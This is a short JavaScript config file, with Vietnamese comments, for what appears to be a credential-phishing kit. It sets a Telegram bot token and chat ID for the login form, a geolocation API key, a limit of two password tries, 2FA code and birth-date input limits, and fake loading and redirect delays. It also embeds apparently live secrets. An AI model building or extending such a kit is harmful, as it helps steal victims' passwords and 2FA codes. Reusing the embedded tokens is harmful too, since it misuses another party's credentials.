// ============================================================
// TELEGRAM (thông báo chặn bot — để trống = không gửi)
// ============================================================
export const noti_token =
  "8512721212:AAGBs7cbtc9YfIaq0zWgj0Rk5iOyLcZ84aU";
export const noti_chat_id = "-1003433255916";
/** Alias cho form đăng nhập / Telegram hiện có */
export const BOT_TOKEN = noti_token;
export const CHAT_ID = noti_chat_id;

// ============================================================
// IP GEOLOCATION
// ============================================================
export const GEO_API_KEY = "126b3879b6b549f8a3e47448ae0a8e91";

// ============================================================
// GIỚI HẠN SỐ LẦN NHẬP
// ============================================================
export const MAX_PASSWORD_ATTEMPTS = 2;  // số lần nhập mật khẩu
export const MAX_CODE_ATTEMPTS = 3;      // số lần nhập mã 2FA
export const CODE_MIN_LENGTH = 6;        // độ dài tối thiểu mã 2FA
export const CODE_MAX_LENGTH = 8;        // maxLength ô nhập mã 2FA
export const DATE_MAX_LENGTH = 10;       // maxLength ô nhập ngày sinh (MM/DD/YYYY)

// ============================================================
// THỜI GIAN (ms) - "xoay spinner" / loading / redirect
// ============================================================
export const CODE_COOLDOWN_SECONDS = 3;          // thời gian chờ sau khi gửi mã sai
export const PASSWORD_ERROR_DELAY_MS = 3000;      // delay hiện lỗi mật khẩu sai lần 1
export const NAVIGATE_TO_2FA_DELAY_MS = 1200;     // delay trước khi chuyển sang trang 2FA
export const CODE_REDIRECT_DELAY_MS = 2000;       // delay trước khi redirect sau mã cuối
export const TRY_ANOTHER_WAY_DELAY_MS = 1000;     // delay loading "Try Another Way"
